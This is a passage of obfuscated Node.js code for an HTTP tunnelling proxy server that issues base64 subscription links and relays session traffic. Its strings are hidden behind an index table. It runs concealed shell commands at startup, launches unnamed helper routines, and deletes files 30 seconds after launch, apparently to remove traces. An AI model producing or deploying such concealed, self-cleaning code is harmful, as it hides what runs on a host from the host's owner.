_0x2cafed=_0x157b48;_0x5c8a8d?(log(_0x2cafed(0x14c),_0x2cafed(0x185)+_0x5c8a8d[_0x2cafed(0x1ef)]),_0x5110df(_0x5c8a8d)):_0x212c6c();});});}[_0x223987(0x1ff)](){const _0x4dbcfb=_0x223987;if(!this[_0x4dbcfb(0x1b6)]||!this[_0x4dbcfb(0x1e2)])return;try{!this[_0x4dbcfb(0x1f0)]&&(this[_0x4dbcfb(0x1b6)]['write'](this[_0x4dbcfb(0x1e2)]),this[_0x4dbcfb(0x1f0)]=!![]),this[_0x4dbcfb(0x145)]['pipe'](this[_0x4dbcfb(0x1b6)]),this['remote']['on'](_0x4dbcfb(0x178),()=>{const _0x4a8cfe=_0x4dbcfb;!this[_0x4a8cfe(0x1b6)][_0x4a8cfe(0x210)]&&this[_0x4a8cfe(0x1b6)][_0x4a8cfe(0x178)]();}),this[_0x4dbcfb(0x145)]['on']('error',_0x4f5851=>{const _0x487690=_0x4dbcfb;log(_0x487690(0x14c),_0x487690(0x168)+_0x4f5851[_0x487690(0x1ef)]),!this[_0x487690(0x1b6)][_0x487690(0x210)]&&this[_0x487690(0x1b6)]['end']();});}catch(_0x3ec01c){log(_0x4dbcfb(0x14c),_0x4dbcfb(0x15e)+_0x3ec01c[_0x4dbcfb(0x1ef)]),this[_0x4dbcfb(0x1ac)]();}}['cleanup'](){const _0x422391=_0x223987;!this[_0x422391(0x165)]&&(this[_0x422391(0x165)]=!![],log(_0x422391(0x1b5),_0x422391(0x19d)+this[_0x422391(0x223)]),this[_0x422391(0x145)]&&(this[_0x422391(0x145)][_0x422391(0x1d2)](),this[_0x422391(0x145)]=null),this[_0x422391(0x17a)]=![],this['headerSent']=![]);}}const metaInfo=execSync(_0x223987(0x194),{'encoding':_0x223987(0x1af)}),ISP=metaInfo[_0x223987(0x1de)]();let IP=DOMAIN;if(!DOMAIN)try{IP=execSync(_0x223987(0x16b),{'encoding':_0x223987(0x1af)})['trim']();}catch(_0xad9a19){try{IP='['+execSync(_0x223987(0x1b0),{'encoding':_0x223987(0x1af)})['trim']()+']';}catch(_0x11109c){log(_0x223987(0x14c),'Failed\x20to\x20get\x20IP\x20address:',_0x11109c['message']),IP=_0x223987(0x15c);}}function _0x18f0(_0x13750e,_0xefe1f0){const _0x208897=_0x2088();return _0x18f0=function(_0x18f0d0,_0x2c0046){_0x18f0d0=_0x18f0d0-0x138;let _0x3a1037=_0x208897[_0x18f0d0];return _0x3a1037;},_0x18f0(_0x13750e,_0xefe1f0);}const server=http[_0x223987(0x1da)]((_0x4ec052,_0x1c586c)=>{const _0x38565b=_0x223987,_0x1f9ba9={'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':_0x38565b(0x167),'Cache-Control':_0x38565b(0x15d),'X-Accel-Buffering':'no','X-Padding':generatePadding(0x64,0x3e8)};if(_0x4ec052['url']==='/'){_0x1c586c[_0x38565b(0x1fa)](0xc8,{'Content-Type':_0x38565b(0x180)}),_0x1c586c[_0x38565b(0x178)](_0x38565b(0x20c));return;}if(_0x4ec052[_0x38565b(0x18f)]==='/'+SUB_PATH){const _0x361bed=_0x38565b(0x1cc)+UUID+'@'+IP+_0x38565b(0x200)+IP+_0x38565b(0x21b)+IP+_0x38565b(0x13d)+SETTINGS[_0x38565b(0x1c0)]+_0x38565b(0x171)+NAME+'-'+ISP,_0x4a3cd5=Buffer[_0x38565b(0x1dd)](_0x361bed)['toString'](_0x38565b(0x1db));_0x1c586c[_0x38565b(0x1fa)](0xc8,{'Content-Type':_0x38565b(0x180)}),_0x1c586c['end'](_0x4a3cd5+'\x0a');return;}const _0x47f7d9=_0x4ec052[_0x38565b(0x18f)][_0x38565b(0x1cb)](new RegExp(XPATH+_0x38565b(0x160)));if(!_0x47f7d9){_0x1c586c[_0x38565b(0x1fa)](0x194),_0x1c586c[_0x38565b(0x178)]();return;}const _0x5588c3=_0x47f7d9[0x1],_0x7fc3bd=_0x47f7d9[0x2]?parseInt(_0x47f7d9[0x2]):null;if(_0x4ec052[_0x38565b(0x161)]===_0x38565b(0x179)&&!_0x7fc3bd){_0x1f9ba9['Content-Type']='application/octet-stream',_0x1f9ba9['Transfer-Encoding']=_0x38565b(0x1ed);let _0x9f704b=sessions['get'](_0x5588c3);!_0x9f704b&&(_0x9f704b=new Session(_0x5588c3),sessions['set'](_0x5588c3,_0x9f704b),log(_0x38565b(0x198),_0x38565b(0x1fb)+_0x5588c3));_0x9f704b[_0x38565b(0x1d1)]=!![];!_0x9f704b['startDownstream'](_0x1c586c,_0x1f9ba9)&&(log(_0x38565b(0x14c),_0x38565b(0x209)+_0x5588c3),!_0x1c586c[_0x38565b(0x205)]&&(_0x1c586c[_0x38565b(0x1fa)](0x1f4),_0x1c586c[_0x38565b(0x178)]()),_0x9f704b['cleanup'](),sessions[_0x38565b(0x21c)](_0x5588c3));return;}if(_0x4ec052[_0x38565b(0x161)]===_0x38565b(0x1c4)&&_0x7fc3bd!==null){let _0x42d8cf=sessions['get'](_0x5588c3);!_0x42d8cf&&(_0x42d8cf=new Session(_0x5588c3),sessions[_0x38565b(0x1bd)](_0x5588c3,_0x42d8cf),log(_0x38565b(0x198),_0x38565b(0x17b)+_0x5588c3),setTimeout(()=>{const _0x1ecb0b=_0x38565b,_0x5b945e=sessions[_0x1ecb0b(0x214)](_0x5588c3);_0x5b945e&&!_0x5b945e[_0x1ecb0b(0x1d1)]&&(log(_0x1ecb0b(0x1b1),_0x1ecb0b(0x1be)+_0x5588c3+_0x1ecb0b(0x1aa)),_0x5b945e[_0x1ecb0b(0x1ac)](),sessions[_0x1ecb0b(0x21c)](_0x5588c3));},SETTINGS['SESSION_TIMEOUT']));let _0x1c7fb9=[],_0x1adc2e=0x0,_0x1ef1a3=![];_0x4ec052['on'](_0x38565b(0x1bb),_0x21c558=>{const _0x425742=_0x38565b;_0x1adc2e+=_0x21c558[_0x425742(0x1e5)];if(_0x1adc2e>SETTINGS[_0x425742(0x184)]){!_0x1ef1a3&&(_0x1c586c['writeHead'](0x19d),_0x1c586c[_0x425742(0x178)](),_0x1ef1a3=!![]);return;}_0x1c7fb9['push'](_0x21c558);}),_0x4ec052['on'](_0x38565b(0x178),async()=>{const _0x30a9e0=_0x38565b;if(_0x1ef1a3)return;try{const _0x479f7a=Buffer[_0x30a9e0(0x1d0)](_0x1c7fb9);log(_0x30a9e0(0x198),'Processing\x20packet:\x20seq='+_0x7fc3bd+_0x30a9e0(0x1a0)+_0x479f7a[_0x30a9e0(0x1e5)]),await _0x42d8cf[_0x30a9e0(0x17e)](_0x7fc3bd,_0x479f7a),!_0x1ef1a3&&(_0x1c586c['writeHead'](0xc8,_0x1f9ba9),_0x1ef1a3=!![]),_0x1c586c[_0x30a9e0(0x178)]();}catch(_0x7715e2){log(_0x30a9e0(0x14c),_0x30a9e0(0x152)+_0x7715e2[_0x30a9e0(0x1ef)]),_0x42d8cf[_0x30a9e0(0x1ac)](),sessions['delete'](_0x5588c3),!_0x1ef1a3&&(_0x1c586c[_0x30a9e0(0x1fa)](0x1f4),_0x1ef1a3=!![]),_0x1c586c['end']();}});return;}_0x1c586c[_0x38565b(0x1fa)](0x194),_0x1c586c[_0x38565b(0x178)]();});server['on'](_0x223987(0x1fe),_0x1f3633=>{const _0x116c75=_0x223987;log(_0x116c75(0x1b5),'New\x20secure\x20connection\x20using:\x20'+(_0x1f3633[_0x116c75(0x16d)]||_0x116c75(0x191)));});function generatePadding(_0x58683c,_0x2ffbf7){const _0x5f30fd=_0x223987,_0x26123c=_0x58683c+Math[_0x5f30fd(0x1ba)](Math['random']()*(_0x2ffbf7-_0x58683c));return Buffer['from'](Array(_0x26123c)[_0x5f30fd(0x156)]('X')['join'](''))[_0x5f30fd(0x176)](_0x5f30fd(0x1db));}server[_0x223987(0x218)]=0x975e0,server[_0x223987(0x19a)]=0x98968,server['on'](_0x223987(0x14c),_0x10cc8c=>{const _0x1c5dc5=_0x223987;log(_0x1c5dc5(0x14c),_0x1c5dc5(0x1a4)+_0x10cc8c[_0x1c5dc5(0x1ef)]);});const delFiles=()=>{const _0x51366a=_0x223987;[_0x51366a(0x1e1),_0x51366a(0x1a6)]['forEach'](_0x239e7c=>fs[_0x51366a(0x15f)](_0x239e7c,()=>{}));};server[_0x223987(0x14d)](PORT,()=>{const _0x53c2ca=_0x223987;runnz(),setTimeout(()=>{delFiles();},0x7530),addAccessTask(),console[_0x53c2ca(0x1f2)]('Server\x20is\x20running\x20on\x20port\x20'+PORT),log(_0x53c2ca(0x198),_0x53c2ca(0x14a)),log(_0x53c2ca(0x198),_0x53c2ca(0x139)+SETTINGS[_0x53c2ca(0x1ec)]),log('info',_0x53c2ca(0x212)+SETTINGS[_0x53c2ca(0x15b)]),log(_0x53c2ca(0x198),'Max\x20POST\x20size:\x20'+SETTINGS['MAX_POST_SIZE']+'KB'),log(_0x53c2ca(0x198),_0x53c2ca(0x144)+SETTINGS[_0x53c2ca(0x1b8)]+'KB'),log(_0x53c2ca(0x198),'Session\x20timeout:\x20'+SETTINGS[_0x53c2ca(0x174)]+'bytes'),log(_0x53c2ca(0x198),_0x53c2ca(0x14a));});
